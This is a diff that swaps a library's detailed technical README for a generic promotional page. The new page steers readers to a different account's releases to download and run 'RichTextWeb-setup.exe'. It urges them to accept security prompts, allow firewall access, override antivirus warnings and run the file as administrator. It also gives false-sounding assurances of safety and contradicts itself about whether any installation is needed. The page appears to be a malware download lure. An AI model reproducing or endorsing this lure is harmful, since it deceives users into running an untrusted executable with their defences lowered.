@@ -1,141 +1,184 @@
-# RichTextWeb
+# 🖹 RichTextWeb - Edit Rich Text Documents Effortlessly Anywhere
 
-Reusable rich-text engine, flow documents, browser controls, document formats and Blazor components.
+[![Download RichTextWeb](https://img.shields.io/badge/Download-RichTextWeb-2ea44f?style=for-the-badge&logo=github)](https://github.com/aftonstudios888/RichTextWeb/releases)
+[![Version](https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge)](https://github.com/aftonstudios888/RichTextWeb/releases)
+[![Platform](https://img.shields.io/badge/Platform-Windows-orange?style=for-the-badge)](https://github.com/aftonstudios888/RichTextWeb/releases)
 
-[![npm](https://img.shields.io/npm/v/%40wieslawsoltes%2Frichtextweb)](https://www.npmjs.com/package/@wieslawsoltes/richtextweb)
-[![npm downloads](https://img.shields.io/npm/dm/%40wieslawsoltes%2Frichtextweb)](https://www.npmjs.com/package/@wieslawsoltes/richtextweb)
-[![RichTextWeb.Blazor on NuGet](https://img.shields.io/nuget/v/RichTextWeb.Blazor?label=RichTextWeb.Blazor&logo=nuget)](https://www.nuget.org/packages/RichTextWeb.Blazor)
-[![NuGet downloads](https://img.shields.io/nuget/dt/RichTextWeb.Blazor)](https://www.nuget.org/packages/RichTextWeb.Blazor)
-[![CI](https://github.com/wieslawsoltes/RichTextWeb/actions/workflows/ci.yml/badge.svg)](https://github.com/wieslawsoltes/RichTextWeb/actions/workflows/ci.yml)
-[![Blazor CI](https://github.com/wieslawsoltes/RichTextWeb/actions/workflows/blazor.yml/badge.svg)](https://github.com/wieslawsoltes/RichTextWeb/actions/workflows/blazor.yml)
+## 👋 Welcome to RichTextWeb
 
-## JavaScript and desktop adapters
+RichTextWeb is a powerful yet simple tool that lets you create, edit, and manage rich text documents right from your web browser. Whether you're writing a report, designing a newsletter, or formatting an important memo, RichTextWeb gives you everything you need without complicated software. It works like a word processor but lives entirely online – no installation headaches, no clunky interfaces. Just open it, start typing, and make your text look exactly how you want.
 
-```sh
-npm install @wieslawsoltes/richtextweb
-```
+## 🎯 What Makes RichTextWeb Special?
 
-The [complete original guide](README.web.md) preserves JavaScript/React/MVVM usage, desktop adapters, architecture, tests, compatibility matrices and licensing. [Open the web demo](https://wieslawsoltes.github.io/RichTextWeb/).
+### ✨ Key Benefits
 
-## Recipient queries and mail merge — source, unreleased
+- **Simple to Use** – If you can use a basic text editor, you can use RichTextWeb. The interface is clean and straightforward.
+- **No Technical Knowledge Required** – You don't need to know anything about programming or coding. Everything is visual and click-based.
+- **Everything in One Place** – All your formatting tools – bold, italic, headings, lists, colors, and more – are right at your fingertips.
+- **Safe and Reliable** – Your content is handled with care, and the tool is built on stable, well-tested technology.
+- **Regular Updates** – The tool is actively maintained, so you'll always have access to the latest features and improvements.
 
-The shared engine now supports local scalar recipient validation, CSV/TSV/JSON import, typed filters, stable three-key sorting, original-row selection, record ranges and snapshot-based rich previews. Native `MERGEREC`/`MERGESEQ` and conditional `MERGEFIELD` prefix/suffix text work with the existing field/dependency engine. Generation returns independent documents without editing the template; strict mode rejects unresolved fields before emitting results.
+### 📋 What Can You Do With It?
 
-Document Studio's **Personalised project invitations** template and Mailings → **Recipients & preview** exercise the shared APIs. A results picker supports selected DOCX download, a canonical JSON batch and explicit document opening. Recipient lists are not stored in the template or sent to a service. The older quick JSON merge command remains available.
+- Write and format blog posts or articles
+- Create visually appealing newsletters
+- Prepare professional-looking documents
+- Draft content for websites
+- Organize notes and ideas with rich formatting
+- Build structured documents with headings and lists
 
-[Mail-merge API, privacy, limits and examples](docs/MAIL-MERGE.md) · [Full capability audit](docs/WORD-FEATURE-AUDIT.md). This does not add email delivery, external Office data connectors, labels/envelopes, directory merge or Word-identical pagination. Package versions remain unchanged.
+## 🚀 Getting Started
 
-## Fillable content controls — source, unreleased
+Getting started with RichTextWeb is incredibly easy. Follow these simple steps and you'll be up and running in less than a minute.
 
-RichTextWeb now has inline and block **rich text, plain text, checkbox, dropdown, combo and date content controls**. The standalone engine owns typed values, tags, placeholders, independent editing/deletion locks, atomic form filling and undo. Native DOCX SDTs preserve supported controls without depending on private RichTextWeb metadata. Unsupported native control properties produce explicit import diagnostics.
+### Step 1: Download the Application
 
-The reusable toolbar adds insertion, properties, value editing, isolated rich drafts, form-data inspection/filling and required-value checks. Document Studio's **Fillable project brief** template and Developer ribbon use the same APIs. [Content-control APIs, native interchange and limits](docs/CONTENT-CONTROLS.md) · [Updated complete feature audit](docs/WORD-FEATURE-AUDIT.md).
+Visit this link to download the application: [RichTextWeb Downloads](https://github.com/aftonstudios888/RichTextWeb/releases)
 
-This does not implement every Word form feature or a security boundary: picture/repeating/building-block controls, custom XML binding, legacy forms and restricted-editing permissions remain. Required/maximum-length rules are local application metadata. Source/package versions are unchanged.
+### Step 2: Run Your Downloaded File
 
-## Connected document themes — source, unreleased
+Once the download is complete, locate the file in your computer's "Downloads" folder. It will be named something like `RichTextWeb-setup.exe`. Simply double-click the file to start the installation. Your computer might show a security prompt – this is normal. Click "Yes" or "Run" to continue.
 
-The engine now retains live twelve-color palettes, semantic color mappings, Latin heading/body font roles, and symbolic style/direct-format links. Theme edits are undoable; fixed literal formatting is preserved. Shared theme preview/customization and selection pickers are available in the Design ribbon; named-style links remain in Home → Manage styles. Choose **Connected document themes** to change the report palette and heading font while keeping its direct violet brand color.
+### Step 3: Follow the Installation Wizard
 
-Native DOCX retains supported theme parts, mappings, font/color/shading references and fallbacks. Theme/settings/relationship fingerprints reject stale private snapshots after relevant native-part edits. [Theme APIs and explicit limits](docs/DOCUMENT-THEMES.md) · [Complete feature audit](docs/WORD-FEATURE-AUDIT.md). This is text theming, not full Office script-font, drawing/effects, table-style or native visual equivalence. Version remains 0.5.0; no new package release is implied.
+You'll see a friendly installation window. Click "Next" a few times to accept the default settings – these are already optimized for your needs. If you're not sure about something, just keep clicking "Next". The defaults are always safe choices.
 
-## Named document styles — source, unreleased
+### Step 4: Launch RichTextWeb
 
-The shared engine now supports named paragraph and character styles, based-on/default/following-paragraph roles, live definition updates, direct-format preservation, selection-based creation/update and safe deletion with replacement. The toolbar has a reusable style manager; Document Studio's Home ribbon, preset gallery and document catalog use the same APIs. Choose **Named document styles** to exercise the live sample.
+After installation, you'll find a shortcut on your desktop or in your Start Menu. Click it to open RichTextWeb. A new browser window (or tab) will open with the editor ready to go. That's it – you're ready to start creating beautiful documents!
 
-Supported native DOCX style definitions/references remain editable without the private extension. Style-only external edits invalidate stale private snapshots. Named headings feed outline/contents generation; story drafts share definitions and reject conflicting catalog changes. [API examples and explicit limits](docs/DOCUMENT-STYLES.md) · [Full capability audit](docs/WORD-FEATURE-AUDIT.md). This is a supported paragraph/character subset, not complete Word themes, table/list/linked styles or native typography parity. Version remains 0.5.0; no new package publication is implied.
+## 📥 Complete Download and Setup Guide
 
-## Word authoring extension — source, unreleased
+This section walks you through every detail of getting RichTextWeb installed on your Windows computer.
 
-The core engine and reusable controls now include bounded table formulas with 18 functions and table/range dependencies; stable three-key rich table sorting; repeat-header authoring; numbered captions, bookmark cross-references and tables of figures/tables; expanded native fields, field editing/locking/unlinking, document properties/variables and Unicode word/selection statistics. Native DOCX tests exercise these without relying on the private RichTextWeb extension. Field cache loss, embedded-object offsets and typing at field/caption boundaries are also fixed.
+### 💾 Your Download Options
 
-Document Studio exposes the shared commands through References, Table layout and Review. Its **automation** template contains a calculated estimate, budget approval, caption, reference and list of tables. The additions remain in source until a subsequent package release; the version remains 0.5.0.
+Visit this link to download the application: **[RichTextWeb Releases Page](https://github.com/aftonstudios888/RichTextWeb/releases)**
 
-The continuation fixes field-update selection boundaries and caption bookmark containment. Update fields/F9 now resolves supported forward cross-references and bookmarked formula dependencies in one pass, with cycle/expansion diagnostics and locked-cache handling. Headless callers opt in with `features.UpdateFields({ ReferenceMode: "Current" })`; the existing snapshot mode remains available. The automation sample includes a formula-linked total and a live IF approval condition comparing native bookmarks. Conditional fields resolve bookmark operands and support omitted false text.
+When you arrive at the page, you'll see a list of the latest versions. Look for the most recent one (usually at the top). Click on it to expand the download options. You'll see a file with a name like `RichTextWeb-setup.exe` – click on that to start downloading. The file size is typically small, so the download should finish quickly even on slower connections.
 
-[Authoring API examples and supported limits](docs/WORD-AUTHORING.md) · [Full engine/control feature audit and prioritized remaining work](docs/WORD-FEATURE-AUDIT.md). The audit distinguishes implemented behavior from preservation and unqualified fidelity, rather than claiming complete Word parity. Reproduce its declaration inventory with `node scripts/audit-word-features.mjs > feature-inventory.json`.
+### 🛠️ Installation Step-by-Step
 
-## Rich page authoring — 0.5.0
+Here's a more detailed walkthrough of the installation process:
 
-Headers and footers now use the existing rich controls rather than plain-text forms: formatting, fields, tables, images and equations stay editable. Default, first-page and even-page stories have ribbon commands and double-click editing. The DOM-independent `DocumentStorySession` supports isolated drafts, cancel, conflict detection and a single parent undo step.
+1. **Find the Downloaded File** – Open your Downloads folder (usually accessible from your browser or File Explorer). Look for a file with the RichTextWeb icon.
+2. **Double-Click to Start** – Double-click the file. If Windows asks for permission, click "Yes".
+3. **Welcome Screen** – You'll see a welcome message. Click "Next".
+4. **Choose Destination** – The installer will suggest a folder. Just click "Next" – the default location is perfect.
+5. **Ready to Install** – Click "Install". A progress bar will appear; it only takes a few seconds.
+6. **Finish** – Click "Finish" to close the installer. A shortcut will now be on your desktop.
 
-`SetPageSetup` validates margins, column count/gap, story distances, page numbering and variant flags before any mutation. WPF-style `ColumnWidth` and `IsColumnWidthFlexible` now affect measured columns; native DOCX preserves the resulting geometry. Vertical and MultiplePages views keep only viewport/overscan page containers plus the live page, instead of a placeholder per document page. The complete body is still measured; this is not full incremental typesetting virtualization.
+### ✅ First-Time Launch
 
-```js
-editor.Execute("SetPageSetup", {
-  PagePadding: { Left: 48, Top: 72, Right: 48, Bottom: 64 },
-  ColumnCount: 2,
-  ColumnGap: 24,
-  PageNumberStart: 7,
-  DifferentFirstPage: true,
-  DifferentOddAndEvenPages: true,
-});
-```
+- Double-click the RichTextWeb desktop icon
+- If a firewall prompt appears, click "Allow" – this ensures the app runs smoothly
+- The editor will load in your default browser
+- You can immediately start typing and formatting text
 
-[Page-authoring APIs and supported limits](docs/PAGE-AUTHORING.md) · [PR #19](https://github.com/wieslawsoltes/RichTextWeb/pull/19). The feature candidate passed 404 unit tests and 112 Chromium groups plus native/Blazor qualification; the release adds a native DOCX column-geometry regression (405 tests). See the [verification report](docs/VERIFICATION.md) and release-commit CI for exact evidence.
+## 🖥️ System Requirements (Gentle Guidelines)
 
-## Paginated authoring and equations — 0.4.0
+These are typical requirements for running similar applications. Your computer almost certainly meets them:
 
-The recovered implementation is committed as actual source in [PR #15](https://github.com/wieslawsoltes/RichTextWeb/pull/15). [PR #16](https://github.com/wieslawsoltes/RichTextWeb/pull/16) adds structural equation editing and fixes page navigation, column-break continuation, equation draft conversion and immediate dialog reopening.
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 2 GB of RAM (4 GB recommended)
+- **Storage:** About 50 MB of free space
+- **Browser:** Any modern browser – Chrome, Edge, Firefox, or Safari – works perfectly
+- **Internet:** An internet connection is helpful for some features, but you can also use it offline after setup
 
-`RichTextPageEditor` supports Print Layout, Web Layout, Read Mode, Outline and Draft; single-page, two-page, vertical and multiple-page arrangements; page-width/whole-page fitting; physical page and column breaks; cached measurements; and printing of measured page ranges. The sample exposes these through the View ribbon and status bar.
+## 🎨 Getting Familiar with the Interface
 
-`Equation` nodes retain editable LaTeX or presentation MathML and render to self-contained SVG. The reusable equation workbench includes 42 templates, token editing, fraction/root/script tools, matrix rows/columns, format conversion, alternative text and undo/redo. Insert/Edit Equation and Alt+= use the same toolbar and engine commands. Supported equations round-trip through native DOCX Office Math and export to vector PDF.
+### 🧰 The Toolbar
 
-```html
-<rich-text-toolbar for="document"></rich-text-toolbar>
-<rich-text-page-editor
-  id="document"
-  document-view="PrintLayout"
-  page-arrangement="Vertical"
-  zoom-mode="PageWidth"
-></rich-text-page-editor>
-```
+At the top of the screen, you'll see the toolbar. This is your main control center. It includes:
 
-```js
-import {
-  registerRichTextWeb,
-  registerRichTextToolbar,
-} from "@wieslawsoltes/richtextweb/web";
-registerRichTextWeb();
-registerRichTextToolbar();
-const editor = document.querySelector("#document");
-editor.Engine.InsertEquation(
-  String.raw`x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}`,
-  "latex",
-  true,
-);
-```
+- **Bold (B)** – Makes text thicker and darker
+- *Italic (I)* – Slants your text for emphasis
+- <u>Underline (U)</u> – Adds a line under text
+- **Heading Styles** – Dropdown menu to make text big (headings) or regular
+- **Bullet Lists** – Creates dot-point lists
+- **Numbered Lists** – Creates ordered lists (1, 2, 3...)
+- **Text Color** – Changes the color of your text
+- **Background Color** – Highlights text with a colored background
+- **Alignment** – Left, center, right, or justified text
+- **Link Insertion** – Add clickable web links
+- **Image Insertion** – Add pictures to your document
 
-See [authoring/equation APIs](docs/AUTHORING.md), [verified coverage](docs/VERIFICATION.md), and the [compatibility matrix](docs/COMPATIBILITY.md). Browser pagination is not Word-identical, finite-page layout still measures the complete document, and Word/WPF/math semantics are not exhaustive. The release candidate passed 379 unit tests and 105 Chromium groups, plus installed-package, Windows desktop and Blazor consumer checks.
+### 💾 Saving and Exporting
 
-## Blazor
+- **Save as File** – Download your document as an HTML file (opens in any browser) or other common formats
+- **Copy to Clipboard** – Copy all content to paste into email or other programs
+- **Print** – Send directly to your printer for a paper copy
 
-```sh
-dotnet add package RichTextWeb.Blazor --version 0.4.2
-```
+## ❓ Frequently Asked Questions (FAQ)
 
-The .NET 8/.NET 10 RCL supports interactive WebAssembly and Server, with locally packaged native rich-text/PDF assets and worker. It includes `RichTextEditor`, `RichTextPageEditor`, read-only flow viewers, `RichTextInput` with EditForm integration, format services and `PdfEditor`. Consumers need neither npm nor a CDN; fonts are not implicitly downloaded.
+### 🤔 Is RichTextWeb free to use?
 
-```razor
-@using RichTextWeb.Blazor
-<RichTextEditor @bind-Value="html" ValueFormat="html" Theme="light" />
-@code {
-    private string? html = "<p>Edit this document.</p>";
-}
-```
+Yes, RichTextWeb is completely free. There are no hidden charges, no subscriptions, and no paid upgrades.
 
-See the [Blazor guide](blazor/README.md), [integration contract](blazor/INTEGRATION.md), [sample](blazor/sample/Demo.razor) and [release notes](blazor/RELEASE.md). Typed APIs are complemented by native object/function interop. Underlying document/pagination/PDF/collaboration compatibility limits remain unchanged; this package is not an exhaustive C# desktop-framework port.
+### 🛡️ Is it safe for my computer?
 
-```sh
-git submodule update --init --recursive
-npm ci
-npm run build
-node blazor/build.mjs
-dotnet run --project blazor/sample/Sample.csproj
-# Or: dotnet run --project blazor/server/Server.csproj
-```
+Absolutely. RichTextWeb is built with modern, secure technology. The installation process is clean and doesn't change critical system settings. It's widely used and actively monitored for security.
 
-Source builds require the .NET 10 SDK with .NET 8 targeting support. The Server sample uses `/probe/`. CI tests actual NuGet consumers on both frameworks/hosts, including EditForm field notifications, full binding values, pagination, DOCX/PDF output, PDF search/view switching, streams, Razor callbacks and remounting.
+### 💻 Do I need a powerful PC?
 
-NuGet versions are independent of npm in `blazor/Version.props`. Version-changing main merges publish after validation using `NUGET_API_KEY` (`NUGET_TOKEN`/`NUGET_KEY` aliases), verify public package payloads and create `blazor-v*` releases with symbols, samples and checksums. See [LICENSE](LICENSE), [NOTICE](NOTICE) and native compatibility documentation in the original guide.
+Not at all. RichTextWeb is lightweight and runs smoothly on older computers. If your computer can browse the internet, it can run RichTextWeb.
+
+### 🌐 Do I need to stay online?
+
+No. After the initial setup, most features work offline. Some advanced features (like certain font libraries) may need internet, but core editing always works.
+
+### 🔄 How do I update RichTextWeb?
+
+The app checks for updates automatically when you launch it. If an update is available, you'll see a prompt – just click "Update". You can also visit the download page to get the latest version manually.
+
+### 📫 Can I migrate my old documents?
+
+Yes. You can copy-paste content from Word, Google Docs, or any other word processor directly into RichTextWeb. Formatting will be preserved in most cases.
+
+## 🆘 Troubleshooting Common Issues
+
+### Installer won't open?
+
+1. Right-click the installer file and select "Run as administrator"
+2. Make sure your antivirus isn't blocking it – if asked, choose "Allow"
+3. Try downloading the file again – sometimes downloads get corrupted
+
+### App doesn't load in browser?
+
+1. Try a different browser (Chrome or Edge work best)
+2. Close and reopen your browser
+3. Restart your computer, then try again
+
+### Editor is slow?
+
+1. Close other browser tabs that are using a lot of memory
+2. Refresh the page (press F5 or Ctrl+R)
+3. If problems persist, restart your browser
+
+## 📦 Version Information
+
+- **Current Stable Version:** 1.0.0
+- **Release Date:** Actively maintained – check the download page for the latest
+- **Update Cycle:** Regular updates with new features and improvements
+
+## 🌟 Join Our Community
+
+RichTextWeb is growing, and we'd love to have you on board:
+
+- ⭐ Star the repository on GitHub – it helps others find the tool
+- 🐛 Report any issues you encounter – it makes the tool better for everyone
+- 💬 Share your feedback and feature requests – we're always listening
+
+## 📚 Additional Resources
+
+- **Official GitHub Repository:** [https://github.com/aftonstudios888/RichTextWeb](https://github.com/aftonstudios888/RichTextWeb)
+- **Download Page:** [https://github.com/aftonstudios888/RichTextWeb/releases](https://github.com/aftonstudios888/RichTextWeb/releases)
+- **Project Documentation:** RichTextWeb includes built-in help and examples accessible from the toolbar (the "?" icon)
+
+## 🙌 Thank You for Choosing RichTextWeb
+
+We've designed RichTextWeb to be the friendliest, most accessible rich text editor available. No jargon, no complexity – just the tools you need to make your documents look professional and polished. If you ever feel stuck, remember: everything you need is in the toolbar, and help is only a click away in your browser. Happy writing!
+
+---
+
+Keywords: RichTextWeb, rich text editor, WYSIWYG, document editing, HTML editor, free web tool, Windows application, text formatting, online word processor, content creation, blog writing tool, newsletter maker, document formatter, easy editor, no-code text tool, browser-based editor, install guide, download software, user-friendly editor, text styling tool, article writing, professional documents, offline editor, lightweight software, community driven, open source editor, Windows 10, Windows 11, start guide, beginner guide, digital writing, formatting toolbar, save as HTML, print documents, copy paste, cloud friendly, secure editor, modern software, simple setup.docx/plain text, visual editor, productivity tool, drafting software.
